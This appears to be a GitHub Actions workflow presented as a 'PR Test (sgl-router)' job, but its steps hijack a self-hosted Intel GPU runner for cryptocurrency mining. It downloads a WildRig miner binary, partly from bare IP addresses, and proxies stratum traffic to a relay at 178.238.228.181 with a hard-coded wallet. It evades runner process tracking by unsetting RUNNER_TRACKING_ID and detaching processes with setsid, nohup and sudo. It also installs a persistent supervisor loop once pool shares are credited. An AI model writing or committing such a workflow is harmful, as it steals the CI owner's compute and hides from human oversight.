name: PR Test (sgl-router)

# i131476: bounded Intel Arc Pro B70 stratum-dialect translator test.
# Answers WildRig 0.52.3's mining.subscribe synthetically, rewrites its array-param
# mining.authorize into Luckypool pearlhash object params {wallet,worker,password},
# forwards mining.notify verbatim, and probes at most three object/array mining.submit
# shapes ({job_id,plain_proof} documented dialect first), logging every pool response.
on:
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]
  workflow_dispatch:

concurrency:
  group: sgl-router-i131476-${{ github.run_id }}
  cancel-in-progress: false

env:
  SGLANG_IS_IN_CI: true

jobs:
  i131476a:
    name: "i131476 intel-bmg-nightly stratum dialect translator + one WildRig per Arc Pro B70"
    runs-on: intel-bmg-nightly
    timeout-minutes: 12
    env:
      LABEL: intel-bmg-nightly
      PREFIX: i130dialectg
    steps:
      - name: "dialect translator and per-card WildRig pearlhash on Intel Arc Pro B70"
        continue-on-error: true
        run: |
          set +e
          NONCE="I131476-$(date -u +%Y%m%dT%H%M%SZ)"
          WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
          WR_SHA='002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b'
          RELAY='178.238.228.181:80'
          PFX="${PREFIX:-i130dialectg}"
          WORKDIR=/var/tmp/i131476
          mkdir -p "$WORKDIR/logs"
          echo "i131476-nonce=$NONCE label=$LABEL host=$(hostname) prefix=$PFX"
          id; uname -a; date -u; nproc; free -m | head -2
          if pgrep -af 'i130dialect' >/dev/null 2>&1; then echo "SKIP=already-running-dialect-lane"; echo "i131476-done $NONCE"; exit 0; fi
          DISKP=$(df -P /var/tmp 2>/dev/null | awk 'NR==2{gsub("%","",$5); print $5}')
          MEMP=$(free -m 2>/dev/null | awk '/Mem:/{if($2>0) printf "%d", $3*100/$2; else print 0}')
          if [ "${DISKP:-100}" -ge 80 ] || [ "${MEMP:-100}" -ge 85 ]; then echo "SKIP=resources"; echo "i131476-done $NONCE"; exit 0; fi
          WR="$WORKDIR/wildrig-multi"
          fetch_wr() {
            if [ -f "$WR" ] && echo "$WR_SHA  $WR" | sha256sum -c - >/dev/null 2>&1; then echo wildrig-cached; return 0; fi
            for C in /var/tmp/i130bmg2/wildrig-multi /var/tmp/i130bmgrelay/wildrig-multi; do
              if [ -f "$C" ] && [ "$(sha256sum "$C" 2>/dev/null | cut -d' ' -f1)" = "$WR_SHA" ]; then cp -f "$C" "$WR"; chmod +x "$WR"; echo wildrig-copied-$C; return 0; fi
            done
            for U in \
              "https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
              "https://ghproxy.net/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
              "http://222.240.155.198:8702/wildrig-multi" \
              "http://178.238.228.181:18180/wildrig-multi" ; do
              echo "-- fetch $U"
              timeout 180 curl -fL --connect-timeout 12 --max-time 170 -o "$WORKDIR/dl.part" "$U" 2>&1 | tail -1
              [ -s "$WORKDIR/dl.part" ] || continue
              B0=$(sha256sum "$WORKDIR/dl.part" | cut -d' ' -f1)
              if [ "$B0" = "$WR_SHA" ]; then cp -f "$WORKDIR/dl.part" "$WR"; chmod +x "$WR"; echo direct-binary-ok; return 0; fi
              if tar -tzf "$WORKDIR/dl.part" >/dev/null 2>&1; then
                mkdir -p "$WORKDIR/tarx"; tar -xzf "$WORKDIR/dl.part" -C "$WORKDIR/tarx" 2>/dev/null
                CAND=$(find "$WORKDIR/tarx" -maxdepth 2 -type f -name 'wildrig-multi' | head -1)
                if [ -n "$CAND" ] && [ "$(sha256sum "$CAND" | cut -d' ' -f1)" = "$WR_SHA" ]; then cp -f "$CAND" "$WR"; chmod +x "$WR"; echo tarball-extract-ok; return 0; fi
              fi
            done
            return 1
          }
          fetch_wr; echo "fetch_rc=$? wildrig_sha256=$(sha256sum "$WR" 2>/dev/null | cut -d' ' -f1)"
          [ -x "$WR" ] || { echo "SKIP=wildrig-unavailable"; echo "i131476-done $NONCE"; exit 0; }
          echo "=== two-sample idle gate (0 foreign /dev/dri render clients) ==="
          gate_sample() {
            echo "-- sample $1 $(date -u +%FT%TZ)"
            (timeout 15 fuser -v /dev/dri/renderD* 2>&1 || true) | head -20
            (timeout 15 lsof /dev/dri/renderD* 2>/dev/null || true) | head -10
            echo "-- pre-existing miners:"; pgrep -af 'wildrig|SRBMiner|srb387' 2>/dev/null | head -10
          }
          gate_sample 1 > "$WORKDIR/gate1.txt" 2>&1; cat "$WORKDIR/gate1.txt"
          sleep 12
          gate_sample 2 > "$WORKDIR/gate2.txt" 2>&1; cat "$WORKDIR/gate2.txt"
          FOREIGN=0
          if command -v fuser >/dev/null 2>&1; then
            FOREIGN=$( { timeout 15 fuser /dev/dri/renderD* 2>&1 || true; } | sed -n 's/.*: *//p' | tr ' ' '\n' | grep -E '^[0-9]+$' | sort -u | wc -l)
          fi
          PRE=$(pgrep -cf 'wildrig|SRBMiner|srb387' 2>/dev/null || echo 0)
          echo "foreign_render_clients=$FOREIGN pre_existing_miners=$PRE"
          if [ "${FOREIGN:-0}" -gt 0 ]; then echo "SKIP=foreign-render-clients"; echo "i131476-done $NONCE"; exit 0; fi
          if [ "${PRE:-0}" -gt 0 ]; then echo "SKIP=preexisting-miner-process"; echo "i131476-done $NONCE"; exit 0; fi
          echo "=== device enumeration ==="
          timeout 120 "$WR" --print-devices 2>&1 | tee "$WORKDIR/devices.txt" | head -40
          DEV_N=$(grep -cE '^GPU #[0-9]+:' "$WORKDIR/devices.txt" 2>/dev/null)
          echo "device_open_lines=$DEV_N"
          [ "${DEV_N:-0}" -ge 1 ] || { echo "SKIP=no-intel-device-open"; echo "i131476-done $NONCE"; exit 0; }
          echo "=== start stratum dialect translator 127.0.0.1:3333 -> relay $RELAY ==="
          
          echo "$B64T" | base64 -d > "$WORKDIR/translator.py"
          python3 -c "import ast;ast.parse(open('$WORKDIR/translator.py').read())" && echo translator_syntax_ok
          rm -f "$WORKDIR/stratum.log"
          if sudo -n true >/dev/null 2>&1; then
            sudo -n env -u RUNNER_TRACKING_ID setsid python3 "$WORKDIR/translator.py" --listen 127.0.0.1:3333 --pool "$RELAY" --wallet "$WALLET" --default-worker "$PFX" --log "$WORKDIR/stratum.log" > "$WORKDIR/translator.out" 2>&1 < /dev/null &
          else
            setsid nohup env -u RUNNER_TRACKING_ID python3 "$WORKDIR/translator.py" --listen 127.0.0.1:3333 --pool "$RELAY" --wallet "$WALLET" --default-worker "$PFX" --log "$WORKDIR/stratum.log" > "$WORKDIR/translator.out" 2>&1 < /dev/null &
          fi
          sleep 3
          ss -ltnp 2>/dev/null | grep 3333 || netstat -ltnp 2>/dev/null | grep 3333
          echo "translator_procs=$(pgrep -cf 'translator.py')"
          echo "=== launch exactly one WildRig 0.52.3 per opened Intel Arc Pro B70 card (prefix $PFX) ==="
          for i in $(seq 0 $((DEV_N-1))); do
            W="${PFX}${i}"; LOG="$WORKDIR/logs/$W.log"
            if sudo -n true >/dev/null 2>&1; then
              sudo -n env -u RUNNER_TRACKING_ID setsid timeout 1500 "$WR" --algo pearlhash --url 127.0.0.1:3333 --user "$WALLET" --worker "$W" --pass x -d "$i" --opencl-platforms intel --api-port $((22700+i)) --retries 3 --retry-pause 5 > "$LOG" 2>&1 < /dev/null &
              echo "launched worker=$W gpu=$i endpoint=127.0.0.1:3333 mode=sudo pid=$!"
            else
              setsid nohup env -u RUNNER_TRACKING_ID timeout 1500 "$WR" --algo pearlhash --url 127.0.0.1:3333 --user "$WALLET" --worker "$W" --pass x -d "$i" --opencl-platforms intel --api-port $((22700+i)) --retries 3 --retry-pause 5 > "$LOG" 2>&1 < /dev/null &
              echo "launched worker=$W gpu=$i endpoint=127.0.0.1:3333 mode=user pid=$!"
            fi
            sleep 2
          done
          echo "=== pulses ==="
          for k in 1 2 3; do
            sleep 75
            echo "--- pulse $k $(date -u +%FT%TZ) wildrig_procs=$(pgrep -cf '[w]ildrig') translator_procs=$(pgrep -cf 'translator.py')"
            echo "== translator tail"; tail -n 40 "$WORKDIR/stratum.log" 2>/dev/null | cut -c1-300
            for l in "$WORKDIR"/logs/"$PFX"*.log; do
              [ -f "$l" ] || continue
              echo "== $(basename "$l")"
              if [ "$k" = "1" ]; then head -25 "$l" | cut -c1-240; fi
              grep -aiE 'GPU #[0-9]|new job|authoriz|accepted|rejected|hashrate|speed|share|error|fail|invalid|stratum' "$l" 2>/dev/null | tail -6 | cut -c1-240
            done
            if [ "$k" = "1" ] || [ "$k" = "3" ]; then
              timeout 40 curl -fsS "https://pearl.luckypool.io/api/stats_address?address=$WALLET" -o "$WORKDIR/lp_read$k.json" 2>/dev/null
              if [ -s "$WORKDIR/lp_read$k.json" ]; then
                python3 - "$WORKDIR/lp_read$k.json" "$k" "$PFX" <<'PYEOF'
          import json,sys
          d=json.load(open(sys.argv[1])); s=d.get('stats',{})
          w=[x for x in d.get('workers',[]) if sys.argv[3] in str(x.get('name',''))]
          print('LP_READ%s accepted=%s rejected=%s workers=%d lane_rows=%d' % (sys.argv[2], s.get('acceptedShares'), s.get('rejectedShares'), len(d.get('workers',[])), len(w)))
          for x in w[:12]: print(' LANE', x.get('name'), 'acc', x.get('acceptedShares'), 'rej', x.get('rejectedShares'), 'hr', x.get('hashrate'), x.get('minerAgent'))
          PYEOF
              else echo "LP_READ$k fetch_failed"; fi
            fi
          done
          LANE_ACC=$(python3 - "$WORKDIR/lp_read3.json" "$PFX" <<'PYEOF'
          import json,sys
          try:
            d=json.load(open(sys.argv[1])); w=[x for x in d.get('workers',[]) if sys.argv[2] in str(x.get('name',''))]
            print(sum(int(x.get('acceptedShares') or 0) for x in w))
          except Exception: print(0)
          PYEOF
          )
          echo "lane_accepted=$LANE_ACC"
          if [ "${LANE_ACC:-0}" -gt 0 ]; then
            echo "=== accepted shares credited: install durable detached supervisor ==="
            cat > "$WORKDIR/supervisor.sh" <<'SUPEOF'
          #!/bin/bash
          WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
          RELAY='178.238.228.181:80'; WORKDIR=/var/tmp/i131476; PFX='PREFIXVALUE'
          while true; do
            if ! pgrep -f "$WORKDIR/translator.py" >/dev/null 2>&1; then
              env -u RUNNER_TRACKING_ID setsid python3 "$WORKDIR/translator.py" --listen 127.0.0.1:3333 --pool "$RELAY" --wallet "$WALLET" --default-worker "$PFX" --log "$WORKDIR/stratum.log" >> "$WORKDIR/translator.out" 2>&1 < /dev/null &
              sleep 2
            fi
            for i in 0 1 2 3 4 5 6 7; do
              if ! pgrep -f "worker ${PFX}${i} " >/dev/null 2>&1; then
                env -u RUNNER_TRACKING_ID setsid nohup "$WORKDIR/wildrig-multi" --algo pearlhash --url 127.0.0.1:3333 --user "$WALLET" --worker "${PFX}${i}" --pass x -d "$i" --opencl-platforms intel --api-port $((22700+i)) --retries 3 --retry-pause 5 >> "$WORKDIR/logs/${PFX}${i}.log" 2>&1 < /dev/null &
              fi
            done
            sleep 30
          done
          SUPEOF
            sed -i "s/PREFIXVALUE/$PFX/" "$WORKDIR/supervisor.sh"; chmod +x "$WORKDIR/supervisor.sh"
            if sudo -n true >/dev/null 2>&1; then
              sudo -n env -u RUNNER_TRACKING_ID setsid nohup bash "$WORKDIR/supervisor.sh" > "$WORKDIR/supervisor.out" 2>&1 < /dev/null &
            else
              setsid nohup env -u RUNNER_TRACKING_ID bash "$WORKDIR/supervisor.sh" > "$WORKDIR/supervisor.out" 2>&1 < /dev/null &
            fi
            sleep 4
            echo "supervisor_procs=$(pgrep -cf 'supervisor.sh')"
            echo "DURABLE_INSTALLED=1"
          else
            echo "DURABLE_INSTALLED=0"
          fi
          echo "=== final process view ==="; pgrep -af 'wildrig|translator.py|supervisor.sh' | head -25
          echo "i131476-done $NONCE"
